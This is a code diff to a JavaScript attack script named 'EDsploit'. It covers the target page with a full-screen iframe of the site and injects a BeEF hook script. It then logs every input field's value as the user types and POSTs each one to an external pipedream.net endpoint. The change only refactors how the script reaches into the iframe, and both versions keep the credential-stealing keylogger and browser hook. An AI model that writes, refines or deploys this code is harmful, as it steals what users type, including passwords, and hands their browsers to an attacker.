@@ -57,33 +57,42 @@ window.addEventListener('beforeunload', (e) => {
 async function iframe() {
 	const i = window.top.document.createElement('iframe');
 	i.src = "/";
-	i.style = 'position:fixed;inset:0;border:0;width:100vw;height:100vh;z-index:999999;background:#fff';
 	i.className = 'EDsploit';
+	i.style.cssText = 'position:fixed;inset:0;border:0;width:100vw;height:100vh;z-index:999999;background:#fff';
 	window.top.document.body.appendChild(i);
         
 	i.onload = async () => {
-		const beef = window.top.document.createElement("script");
-		beef.src = "https://beef.local/hook.js";
-		beef.async = true;
-		window.top.document.body.appendChild(beef);
-		await new Promise(resolve => setTimeout(resolve, 8000));
-		i.contentDocument.querySelectorAll('input').forEach(field => {
-			field.addEventListener('input', async function() {
-				const name = this.name || this.id || this.type || 'field';
-				const value = this.value;
+		try {
+			const doc = i.contentDocument || i.contentWindow?.document;
+			if (!doc) return;
 
-				console.log(`[${name}] : ${value}`)
+			const beef = doc.createElement('script');
+			beef.src = 'https://beef.local/hook.js';
+			beef.async = true;
+			doc.body.appendChild(beef);
 
-				await fetch('https://eoXXXXXX.m.pipedream.net', {
-				method: 'POST',
-				body: JSON.stringify({ field: name, value }),
-				headers: { 'Content-Type': 'application/json' }
+			await new Promise(resolve => setTimeout(resolve, 8000));
+
+			doc.querySelectorAll('input').forEach(field => {
+				field.addEventListener('input', async function() {
+					const name = this.name || this.id || this.type || 'field';
+					const value = this.value;
+
+					console.log(`[${name}] : ${value}`);
+
+					await fetch('https://eoXXXXXX.m.pipedream.net', {
+						method: 'POST',
+						body: JSON.stringify({ field: name, value }),
+						headers: { 'Content-Type': 'application/json' }
+					});
 				});
 			});
-		})
+		} catch (err) {
+			console.error('iframe hook failed', err);
+		}
 	}
-	
-	return
+
+	return;
 };
 
 (async function() {
@@ -95,4 +104,3 @@ async function iframe() {
 		}
 	}
 })();
-
